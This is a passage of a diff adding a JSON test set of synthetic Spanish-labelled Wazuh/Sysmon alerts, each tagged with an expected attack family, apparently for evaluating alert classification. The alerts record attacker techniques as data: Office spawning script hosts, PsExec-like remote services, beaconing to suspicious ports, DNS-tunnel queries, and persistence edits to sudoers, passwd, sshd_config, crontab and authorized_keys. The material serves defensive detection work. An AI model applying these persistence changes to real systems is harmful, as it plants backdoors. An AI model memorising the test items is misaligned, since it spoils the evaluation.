+    "texto": "Rule: 100105 (level 12) -> 'ejecución sospechosa (Office lanza mshta, certutil decodifica o acceso a LSASS)' | Agent: pc-ventas-14 (192.0.2.48) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\System32\\cscript.exe | data.win.eventdata.commandLine: cscript.exe //nologo C:\\Users\\Public\\x.js | data.win.eventdata.parentImage: C:\\Program Files\\Office\\root\\Office16\\WINWORD.EXE | data.win.eventdata.user: EJEMPLO\\usuario04",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100105",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-052",
+    "texto": "Rule: 100105 (level 12) -> 'ejecución sospechosa (Office lanza mshta, certutil decodifica o acceso a LSASS)' | Agent: pc-rrhh-02 (192.0.2.33) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\System32\\installutil.exe | data.win.eventdata.commandLine: installutil.exe /logfile= /U C:\\Users\\Public\\a.dll | data.win.eventdata.parentImage: C:\\Program Files\\Office\\root\\Office16\\WINWORD.EXE | data.win.eventdata.user: EJEMPLO\\usuario05",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100105",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-053",
+    "texto": "Rule: 100107 (level 8) -> 'inicio de sesión remoto (RDP o NTLM de red)' | Agent: srv-web-01 (192.0.2.10) | Location: EventChannel | data.win.system.eventID: 4624 | data.win.system.channel: Security | data.win.eventdata.targetUserName: admin.local | data.win.eventdata.ipAddress: 192.0.2.31 | data.win.eventdata.logonType: 10 | data.win.eventdata.workstationName: PC-ADM-07 | data.win.eventdata.authenticationPackageName: Negotiate",
+    "familia_esperada": "F3",
+    "familia_candidata": "F3",
+    "regla": "100107",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-054",
+    "texto": "Rule: 100107 (level 8) -> 'inicio de sesión remoto (RDP o NTLM de red)' | Agent: srv-app-03 (192.0.2.22) | Location: EventChannel | data.win.system.eventID: 4624 | data.win.system.channel: Security | data.win.eventdata.targetUserName: administrador | data.win.eventdata.ipAddress: 192.0.2.47 | data.win.eventdata.logonType: 3 | data.win.eventdata.workstationName: PC-VENTAS-12 | data.win.eventdata.authenticationPackageName: NTLM",
+    "familia_esperada": "F3",
+    "familia_candidata": "F3",
+    "regla": "100107",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-055",
+    "texto": "Rule: 100107 (level 8) -> 'inicio de sesión remoto (RDP o NTLM de red)' | Agent: srv-bd-02 (192.0.2.20) | Location: EventChannel | data.win.system.eventID: 4624 | data.win.system.channel: Security | data.win.eventdata.targetUserName: operador02 | data.win.eventdata.ipAddress: 192.0.2.36 | data.win.eventdata.logonType: 10 | data.win.eventdata.workstationName: PC-CONTAB-03 | data.win.eventdata.authenticationPackageName: Kerberos",
+    "familia_esperada": "F3",
+    "familia_candidata": "F3",
+    "regla": "100107",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-056",
+    "texto": "Rule: 100107 (level 8) -> 'inicio de sesión remoto (RDP o NTLM de red)' | Agent: srv-fich-01 (192.0.2.12) | Location: EventChannel | data.win.system.eventID: 4624 | data.win.system.channel: Security | data.win.eventdata.targetUserName: admin.local | data.win.eventdata.ipAddress: 192.0.2.48 | data.win.eventdata.logonType: 3 | data.win.eventdata.workstationName: PC-VENTAS-14 | data.win.eventdata.authenticationPackageName: NTLM",
+    "familia_esperada": "F3",
+    "familia_candidata": "F3",
+    "regla": "100107",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-057",
+    "texto": "Rule: 100107 (level 8) -> 'inicio de sesión remoto (RDP o NTLM de red)' | Agent: srv-dc-01 (192.0.2.5) | Location: EventChannel | data.win.system.eventID: 4624 | data.win.system.channel: Security | data.win.eventdata.targetUserName: administrador | data.win.eventdata.ipAddress: 192.0.2.33 | data.win.eventdata.logonType: 10 | data.win.eventdata.workstationName: PC-RRHH-02 | data.win.eventdata.authenticationPackageName: Negotiate",
+    "familia_esperada": "F3",
+    "familia_candidata": "F3",
+    "regla": "100107",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-058",
+    "texto": "Rule: 100108 (level 12) -> 'ejecución remota o uso de recursos administrativos (PsExec, servicios, WinRM, Impacket)' | Agent: srv-web-01 (192.0.2.10) | Location: EventChannel | data.win.system.eventID: 7045 | data.win.system.channel: System | data.win.eventdata.serviceName: PSEXESVC | data.win.eventdata.imagePath: %SystemRoot%\\PSEXESVC.exe | data.win.eventdata.serviceType: user mode service | data.win.eventdata.startType: demand start | data.win.eventdata.accountName: LocalSystem",
+    "familia_esperada": "F3",
+    "familia_candidata": "F3",
+    "regla": "100108",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-059",
+    "texto": "Rule: 100108 (level 12) -> 'ejecución remota o uso de recursos administrativos (PsExec, servicios, WinRM, Impacket)' | Agent: srv-app-03 (192.0.2.22) | Location: EventChannel | data.win.system.eventID: 7045 | data.win.system.channel: System | data.win.eventdata.serviceName: PAExec | data.win.eventdata.imagePath: %SystemRoot%\\PAExec.exe | data.win.eventdata.serviceType: user mode service | data.win.eventdata.startType: demand start | data.win.eventdata.accountName: LocalSystem",
+    "familia_esperada": "F3",
+    "familia_candidata": "F3",
+    "regla": "100108",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-060",
+    "texto": "Rule: 100108 (level 12) -> 'ejecución remota o uso de recursos administrativos (PsExec, servicios, WinRM, Impacket)' | Agent: srv-bd-02 (192.0.2.20) | Location: EventChannel | data.win.system.eventID: 7045 | data.win.system.channel: System | data.win.eventdata.serviceName: RemCom | data.win.eventdata.imagePath: %SystemRoot%\\RemCom.exe | data.win.eventdata.serviceType: user mode service | data.win.eventdata.startType: demand start | data.win.eventdata.accountName: LocalSystem",
+    "familia_esperada": "F3",
+    "familia_candidata": "F3",
+    "regla": "100108",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-061",
+    "texto": "Rule: 100108 (level 12) -> 'ejecución remota o uso de recursos administrativos (PsExec, servicios, WinRM, Impacket)' | Agent: srv-fich-01 (192.0.2.12) | Location: EventChannel | data.win.system.eventID: 7045 | data.win.system.channel: System | data.win.eventdata.serviceName: CSEXEC | data.win.eventdata.imagePath: %SystemRoot%\\PSEXESVC.exe | data.win.eventdata.serviceType: user mode service | data.win.eventdata.startType: demand start | data.win.eventdata.accountName: LocalSystem",
+    "familia_esperada": "F3",
+    "familia_candidata": "F3",
+    "regla": "100108",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-062",
+    "texto": "Rule: 100108 (level 12) -> 'ejecución remota o uso de recursos administrativos (PsExec, servicios, WinRM, Impacket)' | Agent: srv-dc-01 (192.0.2.5) | Location: EventChannel | data.win.system.eventID: 7045 | data.win.system.channel: System | data.win.eventdata.serviceName: PSEXESVC | data.win.eventdata.imagePath: %SystemRoot%\\PAExec.exe | data.win.eventdata.serviceType: user mode service | data.win.eventdata.startType: demand start | data.win.eventdata.accountName: LocalSystem",
+    "familia_esperada": "F3",
+    "familia_candidata": "F3",
+    "regla": "100108",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-063",
+    "texto": "Rule: 100108 (level 12) -> 'ejecución remota o uso de recursos administrativos (PsExec, servicios, WinRM, Impacket)' | Agent: srv-web-01 (192.0.2.10) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\System32\\cmd.exe | data.win.eventdata.commandLine: cmd.exe /Q /c whoami /all | data.win.eventdata.parentImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe | data.win.eventdata.user: EJEMPLO\\admin.local",
+    "familia_esperada": "F3",
+    "familia_candidata": "F3",
+    "regla": "100108",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-064",
+    "texto": "Rule: 100108 (level 12) -> 'ejecución remota o uso de recursos administrativos (PsExec, servicios, WinRM, Impacket)' | Agent: srv-app-03 (192.0.2.22) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\System32\\cmd.exe | data.win.eventdata.commandLine: cmd.exe /Q /c whoami /all | data.win.eventdata.parentImage: C:\\Windows\\System32\\wsmprovhost.exe | data.win.eventdata.user: EJEMPLO\\admin.local",
+    "familia_esperada": "F3",
+    "familia_candidata": "F3",
+    "regla": "100108",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-065",
+    "texto": "Rule: 100108 (level 12) -> 'ejecución remota o uso de recursos administrativos (PsExec, servicios, WinRM, Impacket)' | Agent: srv-bd-02 (192.0.2.20) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\System32\\cmd.exe | data.win.eventdata.commandLine: cmd.exe /Q /c whoami /all | data.win.eventdata.parentImage: C:\\Windows\\System32\\winrshost.exe | data.win.eventdata.user: EJEMPLO\\admin.local",
+    "familia_esperada": "F3",
+    "familia_candidata": "F3",
+    "regla": "100108",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-066",
+    "texto": "Rule: 100108 (level 12) -> 'ejecución remota o uso de recursos administrativos (PsExec, servicios, WinRM, Impacket)' | Agent: srv-fich-01 (192.0.2.12) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\System32\\cmd.exe | data.win.eventdata.commandLine: cmd.exe /Q /c whoami /all | data.win.eventdata.parentImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe | data.win.eventdata.user: EJEMPLO\\admin.local",
+    "familia_esperada": "F3",
+    "familia_candidata": "F3",
+    "regla": "100108",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-067",
+    "texto": "Rule: 100107 (level 6) -> 'inicio de sesión remoto (RDP o NTLM de red)' | Agent: srv-web-01 (192.0.2.10) | Location: EventChannel | data.win.system.eventID: 4624 | data.win.system.channel: Security | data.win.eventdata.targetUserName: admin.local | data.win.eventdata.ipAddress: 192.0.2.31 | data.win.eventdata.logonType: 3 | data.win.eventdata.authenticationPackageName: NTLM | data.win.eventdata.keyLength: 0",
+    "familia_esperada": "F3",
+    "familia_candidata": "F3",
+    "regla": "100107",
+    "playbook_esperado": "",
+    "frontera": "F1/F3"
+  },
+  {
+    "id": "K150-068",
+    "texto": "Rule: 100107 (level 6) -> 'inicio de sesión remoto (RDP o NTLM de red)' | Agent: srv-app-03 (192.0.2.22) | Location: EventChannel | data.win.system.eventID: 4624 | data.win.system.channel: Security | data.win.eventdata.targetUserName: admin.local | data.win.eventdata.ipAddress: 192.0.2.47 | data.win.eventdata.logonType: 3 | data.win.eventdata.authenticationPackageName: NTLM | data.win.eventdata.keyLength: 0",
+    "familia_esperada": "F3",
+    "familia_candidata": "F3",
+    "regla": "100107",
+    "playbook_esperado": "",
+    "frontera": "F1/F3"
+  },
+  {
+    "id": "K150-069",
+    "texto": "Rule: 100107 (level 6) -> 'inicio de sesión remoto (RDP o NTLM de red)' | Agent: srv-bd-02 (192.0.2.20) | Location: EventChannel | data.win.system.eventID: 4624 | data.win.system.channel: Security | data.win.eventdata.targetUserName: admin.local | data.win.eventdata.ipAddress: 192.0.2.36 | data.win.eventdata.logonType: 3 | data.win.eventdata.authenticationPackageName: NTLM | data.win.eventdata.keyLength: 0",
+    "familia_esperada": "F3",
+    "familia_candidata": "F3",
+    "regla": "100107",
+    "playbook_esperado": "",
+    "frontera": "F1/F3"
+  },
+  {
+    "id": "K150-070",
+    "texto": "Rule: 100108 (level 12) -> 'ejecución remota o uso de recursos administrativos (PsExec, servicios, WinRM, Impacket)' | Agent: srv-web-01 (192.0.2.10) | Location: /var/log/auth.log | data.srcip: 192.0.2.22 | data.srcuser: root | full_log: Oct 15 11:00:10 srv-web-01 sshd[8000]: Accepted publickey for root from 192.0.2.22 port 40000 ssh2",
+    "familia_esperada": "F3",
+    "familia_candidata": "F3",
+    "regla": "100108",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-071",
+    "texto": "Rule: 100108 (level 12) -> 'ejecución remota o uso de recursos administrativos (PsExec, servicios, WinRM, Impacket)' | Agent: srv-app-03 (192.0.2.22) | Location: /var/log/auth.log | data.srcip: 192.0.2.20 | data.srcuser: root | full_log: Oct 15 11:01:10 srv-app-03 sshd[8001]: Accepted publickey for root from 192.0.2.20 port 40001 ssh2",
+    "familia_esperada": "F3",
+    "familia_candidata": "F3",
+    "regla": "100108",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-072",
+    "texto": "Rule: 100108 (level 12) -> 'ejecución remota o uso de recursos administrativos (PsExec, servicios, WinRM, Impacket)' | Agent: srv-bd-02 (192.0.2.20) | Location: /var/log/auth.log | data.srcip: 192.0.2.12 | data.srcuser: root | full_log: Oct 15 11:02:10 srv-bd-02 sshd[8002]: Accepted publickey for root from 192.0.2.12 port 40002 ssh2",
+    "familia_esperada": "F3",
+    "familia_candidata": "F3",
+    "regla": "100108",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-073",
+    "texto": "Rule: 100108 (level 12) -> 'ejecución remota o uso de recursos administrativos (PsExec, servicios, WinRM, Impacket)' | Agent: srv-fich-01 (192.0.2.12) | Location: /var/log/auth.log | data.srcip: 192.0.2.5 | data.srcuser: root | full_log: Oct 15 11:03:10 srv-fich-01 sshd[8003]: Accepted publickey for root from 192.0.2.5 port 40003 ssh2",
+    "familia_esperada": "F3",
+    "familia_candidata": "F3",
+    "regla": "100108",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-074",
+    "texto": "Rule: 100108 (level 12) -> 'ejecución remota o uso de recursos administrativos (PsExec, servicios, WinRM, Impacket)' | Agent: srv-web-01 (192.0.2.10) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\System32\\cmd.exe | data.win.eventdata.commandLine: cmd.exe /c ipconfig /all | data.win.eventdata.parentImage: C:\\Windows\\System32\\mmc.exe | data.win.eventdata.user: EJEMPLO\\admin.local",
+    "familia_esperada": "F3",
+    "familia_candidata": "F3",
+    "regla": "100108",
+    "playbook_esperado": "",
+    "frontera": "F2/F3"
+  },
+  {
+    "id": "K150-075",
+    "texto": "Rule: 100108 (level 12) -> 'ejecución remota o uso de recursos administrativos (PsExec, servicios, WinRM, Impacket)' | Agent: srv-app-03 (192.0.2.22) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\System32\\cmd.exe | data.win.eventdata.commandLine: cmd.exe /c ipconfig /all | data.win.eventdata.parentImage: C:\\Windows\\System32\\mmc.exe | data.win.eventdata.user: EJEMPLO\\admin.local",
+    "familia_esperada": "F3",
+    "familia_candidata": "F3",
+    "regla": "100108",
+    "playbook_esperado": "",
+    "frontera": "F2/F3"
+  },
+  {
+    "id": "K150-076",
+    "texto": "Rule: 100108 (level 12) -> 'ejecución remota o uso de recursos administrativos (PsExec, servicios, WinRM, Impacket)' | Agent: srv-bd-02 (192.0.2.20) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\System32\\cmd.exe | data.win.eventdata.commandLine: cmd.exe /c ipconfig /all | data.win.eventdata.parentImage: C:\\Windows\\System32\\mmc.exe | data.win.eventdata.user: EJEMPLO\\admin.local",
+    "familia_esperada": "F3",
+    "familia_candidata": "F3",
+    "regla": "100108",
+    "playbook_esperado": "",
+    "frontera": "F2/F3"
+  },
+  {
+    "id": "K150-077",
+    "texto": "Rule: 100109 (level 12) -> 'binario sospechoso abrió una conexión de salida' | Agent: pc-adm-07 (192.0.2.31) | Location: EventChannel | data.win.system.eventID: 3 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Users\\Public\\upd.exe | data.win.eventdata.destinationIp: 192.0.2.77 | data.win.eventdata.destinationPort: 443 | data.win.eventdata.destinationHostname: sync-datos.example | data.win.eventdata.protocol: tcp | data.win.eventdata.initiated: true | data.win.eventdata.user: EJEMPLO\\usuario01",
+    "familia_esperada": "F4",
+    "familia_candidata": "F4",
+    "regla": "100109",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-078",
+    "texto": "Rule: 100109 (level 12) -> 'binario sospechoso abrió una conexión de salida' | Agent: pc-ventas-12 (192.0.2.47) | Location: EventChannel | data.win.system.eventID: 3 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\Temp\\sync.exe | data.win.eventdata.destinationIp: 192.0.2.88 | data.win.eventdata.destinationPort: 8443 | data.win.eventdata.destinationHostname: - | data.win.eventdata.protocol: tcp | data.win.eventdata.initiated: true | data.win.eventdata.user: EJEMPLO\\usuario02",
+    "familia_esperada": "F4",
+    "familia_candidata": "F4",
+    "regla": "100109",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-079",
+    "texto": "Rule: 100109 (level 12) -> 'binario sospechoso abrió una conexión de salida' | Agent: pc-contab-03 (192.0.2.36) | Location: EventChannel | data.win.system.eventID: 3 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Users\\usuario03\\AppData\\Roaming\\s\\cl.exe | data.win.eventdata.destinationIp: 192.0.2.99 | data.win.eventdata.destinationPort: 53 | data.win.eventdata.destinationHostname: upd.example | data.win.eventdata.protocol: tcp | data.win.eventdata.initiated: true | data.win.eventdata.user: EJEMPLO\\usuario03",
+    "familia_esperada": "F4",
+    "familia_candidata": "F4",
+    "regla": "100109",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-080",
+    "texto": "Rule: 100109 (level 12) -> 'binario sospechoso abrió una conexión de salida' | Agent: pc-ventas-14 (192.0.2.48) | Location: EventChannel | data.win.system.eventID: 3 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\System32\\rundll32.exe | data.win.eventdata.destinationIp: 192.0.2.150 | data.win.eventdata.destinationPort: 4444 | data.win.eventdata.destinationHostname: - | data.win.eventdata.protocol: tcp | data.win.eventdata.initiated: true | data.win.eventdata.user: EJEMPLO\\usuario04",
+    "familia_esperada": "F4",
+    "familia_candidata": "F4",
+    "regla": "100109",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-081",
+    "texto": "Rule: 100109 (level 12) -> 'binario sospechoso abrió una conexión de salida' | Agent: pc-rrhh-02 (192.0.2.33) | Location: EventChannel | data.win.system.eventID: 3 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\ProgramData\\a\\b.exe | data.win.eventdata.destinationIp: 192.0.2.160 | data.win.eventdata.destinationPort: 1080 | data.win.eventdata.destinationHostname: cdn-x.example | data.win.eventdata.protocol: tcp | data.win.eventdata.initiated: true | data.win.eventdata.user: EJEMPLO\\usuario05",
+    "familia_esperada": "F4",
+    "familia_candidata": "F4",
+    "regla": "100109",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-082",
+    "texto": "Rule: 100109 (level 12) -> 'binario sospechoso abrió una conexión de salida' | Agent: pc-adm-07 (192.0.2.31) | Location: EventChannel | data.win.system.eventID: 3 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Users\\Public\\dnsc.exe | data.win.eventdata.destinationIp: 192.0.2.170 | data.win.eventdata.destinationPort: 443 | data.win.eventdata.destinationHostname: - | data.win.eventdata.protocol: tcp | data.win.eventdata.initiated: true | data.win.eventdata.user: EJEMPLO\\operador02",
+    "familia_esperada": "F4",
+    "familia_candidata": "F4",
+    "regla": "100109",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-083",
+    "texto": "Rule: 100109 (level 12) -> 'binario sospechoso abrió una conexión de salida' | Agent: pc-ventas-12 (192.0.2.47) | Location: EventChannel | data.win.system.eventID: 3 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Users\\Public\\upd.exe | data.win.eventdata.destinationIp: 192.0.2.200 | data.win.eventdata.destinationPort: 9001 | data.win.eventdata.destinationHostname: - | data.win.eventdata.protocol: tcp | data.win.eventdata.initiated: true | data.win.eventdata.user: EJEMPLO\\admin.local",
+    "familia_esperada": "F4",
+    "familia_candidata": "F4",
+    "regla": "100109",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-084",
+    "texto": "Rule: 100109 (level 12) -> 'binario sospechoso abrió una conexión de salida' | Agent: pc-contab-03 (192.0.2.36) | Location: EventChannel | data.win.system.eventID: 3 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\Temp\\sync.exe | data.win.eventdata.destinationIp: 192.0.2.210 | data.win.eventdata.destinationPort: 80 | data.win.eventdata.destinationHostname: - | data.win.eventdata.protocol: tcp | data.win.eventdata.initiated: true | data.win.eventdata.user: EJEMPLO\\svc_respaldo",
+    "familia_esperada": "F4",
+    "familia_candidata": "F4",
+    "regla": "100109",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-085",
+    "texto": "Rule: 100109 (level 12) -> 'binario sospechoso abrió una conexión de salida' | Agent: pc-ventas-14 (192.0.2.48) | Location: EventChannel | data.win.system.eventID: 3 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Users\\usuario.prueba\\AppData\\Roaming\\s\\cl.exe | data.win.eventdata.destinationIp: 192.0.2.220 | data.win.eventdata.destinationPort: 443 | data.win.eventdata.destinationHostname: - | data.win.eventdata.protocol: tcp | data.win.eventdata.initiated: true | data.win.eventdata.user: EJEMPLO\\usuario.prueba",
+    "familia_esperada": "F4",
+    "familia_candidata": "F4",
+    "regla": "100109",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-086",
+    "texto": "Rule: 100109 (level 12) -> 'binario sospechoso abrió una conexión de salida' | Agent: pc-rrhh-02 (192.0.2.33) | Location: EventChannel | data.win.system.eventID: 3 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\System32\\rundll32.exe | data.win.eventdata.destinationIp: 192.0.2.230 | data.win.eventdata.destinationPort: 8080 | data.win.eventdata.destinationHostname: - | data.win.eventdata.protocol: tcp | data.win.eventdata.initiated: true | data.win.eventdata.user: EJEMPLO\\soporte_tmp",
+    "familia_esperada": "F4",
+    "familia_candidata": "F4",
+    "regla": "100109",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-087",
+    "texto": "Rule: 100109 (level 12) -> 'binario sospechoso abrió una conexión de salida' | Agent: pc-adm-07 (192.0.2.31) | Location: EventChannel | data.win.system.eventID: 22 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Users\\Public\\dnsc.exe | data.win.eventdata.queryName: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0.t.datos-sync.example | data.win.eventdata.queryStatus: 0 | data.win.eventdata.user: EJEMPLO\\usuario01",
+    "familia_esperada": "F4",
+    "familia_candidata": "F4",
+    "regla": "100109",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-088",
+    "texto": "Rule: 100109 (level 12) -> 'binario sospechoso abrió una conexión de salida' | Agent: pc-ventas-12 (192.0.2.47) | Location: EventChannel | data.win.system.eventID: 22 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Users\\Public\\dnsc.exe | data.win.eventdata.queryName: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1.t.datos-sync.example | data.win.eventdata.queryStatus: 0 | data.win.eventdata.user: EJEMPLO\\usuario02",
+    "familia_esperada": "F4",
+    "familia_candidata": "F4",
+    "regla": "100109",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-089",
+    "texto": "Rule: 100109 (level 12) -> 'binario sospechoso abrió una conexión de salida' | Agent: pc-contab-03 (192.0.2.36) | Location: EventChannel | data.win.system.eventID: 22 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Users\\Public\\dnsc.exe | data.win.eventdata.queryName: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa2.t.datos-sync.example | data.win.eventdata.queryStatus: 0 | data.win.eventdata.user: EJEMPLO\\usuario03",
+    "familia_esperada": "F4",
+    "familia_candidata": "F4",
+    "regla": "100109",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-090",
+    "texto": "Rule: 100109 (level 12) -> 'binario sospechoso abrió una conexión de salida' | Agent: pc-adm-07 (192.0.2.31) | Location: EventChannel | data.win.system.eventID: 3 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Program Files\\Sync\\sync.exe | data.win.eventdata.destinationIp: 192.0.2.77 | data.win.eventdata.destinationPort: 443 | data.win.eventdata.destinationHostname: archivos-compartidos.example | data.win.eventdata.protocol: tcp | data.win.eventdata.initiated: true | data.win.eventdata.user: EJEMPLO\\usuario01",
+    "familia_esperada": "F4",
+    "familia_candidata": "F4",
+    "regla": "100109",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-091",
+    "texto": "Rule: 100109 (level 12) -> 'binario sospechoso abrió una conexión de salida' | Agent: pc-ventas-12 (192.0.2.47) | Location: EventChannel | data.win.system.eventID: 3 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Program Files\\Sync\\sync.exe | data.win.eventdata.destinationIp: 192.0.2.88 | data.win.eventdata.destinationPort: 443 | data.win.eventdata.destinationHostname: archivos-compartidos.example | data.win.eventdata.protocol: tcp | data.win.eventdata.initiated: true | data.win.eventdata.user: EJEMPLO\\usuario02",
+    "familia_esperada": "F4",
+    "familia_candidata": "F4",
+    "regla": "100109",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-092",
+    "texto": "Rule: 100109 (level 12) -> 'binario sospechoso abrió una conexión de salida' | Agent: pc-contab-03 (192.0.2.36) | Location: EventChannel | data.win.system.eventID: 3 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Program Files\\Sync\\sync.exe | data.win.eventdata.destinationIp: 192.0.2.99 | data.win.eventdata.destinationPort: 443 | data.win.eventdata.destinationHostname: archivos-compartidos.example | data.win.eventdata.protocol: tcp | data.win.eventdata.initiated: true | data.win.eventdata.user: EJEMPLO\\usuario03",
+    "familia_esperada": "F4",
+    "familia_candidata": "F4",
+    "regla": "100109",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-093",
+    "texto": "Rule: 100110 (level 7) -> 'archivo vigilado modificado, agregado o borrado' | Agent: srv-web-01 (192.0.2.10) | Location: syscheck | syscheck.path: /etc/sudoers | syscheck.event: modified | syscheck.mode: whodata | syscheck.diff: +operador02 ALL=(ALL) NOPASSWD: ALL | syscheck.audit.user.name: usuario01 | syscheck.audit.process.name: /usr/bin/vi | full_log: File '/etc/sudoers' modified",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100110",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-094",
+    "texto": "Rule: 100110 (level 7) -> 'archivo vigilado modificado, agregado o borrado' | Agent: srv-app-03 (192.0.2.22) | Location: syscheck | syscheck.path: /etc/passwd | syscheck.event: modified | syscheck.mode: whodata | syscheck.diff: +respaldo:x:0:0::/root:/bin/bash | syscheck.audit.user.name: usuario02 | syscheck.audit.process.name: /usr/sbin/useradd | full_log: File '/etc/passwd' modified",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100110",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-095",
+    "texto": "Rule: 100110 (level 7) -> 'archivo vigilado modificado, agregado o borrado' | Agent: srv-bd-02 (192.0.2.20) | Location: syscheck | syscheck.path: /etc/ssh/sshd_config | syscheck.event: modified | syscheck.mode: whodata | syscheck.diff: -PermitRootLogin no +PermitRootLogin yes | syscheck.audit.user.name: usuario03 | syscheck.audit.process.name: /bin/nano | full_log: File '/etc/ssh/sshd_config' modified",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100110",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-096",
+    "texto": "Rule: 100110 (level 7) -> 'archivo vigilado modificado, agregado o borrado' | Agent: srv-fich-01 (192.0.2.12) | Location: syscheck | syscheck.path: /etc/crontab | syscheck.event: modified | syscheck.mode: whodata | syscheck.diff: +*/5 * * * * root /opt/.c/su | syscheck.audit.user.name: usuario04 | syscheck.audit.process.name: /bin/sh | full_log: File '/etc/crontab' modified",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100110",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-097",
+    "texto": "Rule: 100110 (level 7) -> 'archivo vigilado modificado, agregado o borrado' | Agent: srv-dc-01 (192.0.2.5) | Location: syscheck | syscheck.path: /root/.ssh/authorized_keys | syscheck.event: modified | syscheck.mode: whodata | syscheck.diff: +ssh-ed25519 AAAA... intruso | syscheck.audit.user.name: usuario05 | syscheck.audit.process.name: /bin/bash | full_log: File '/root/.ssh/authorized_keys' modified",
+    "familia_esperada": "F5",
+    "familia_candidata": "F5",
+    "regla": "100110",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-098",
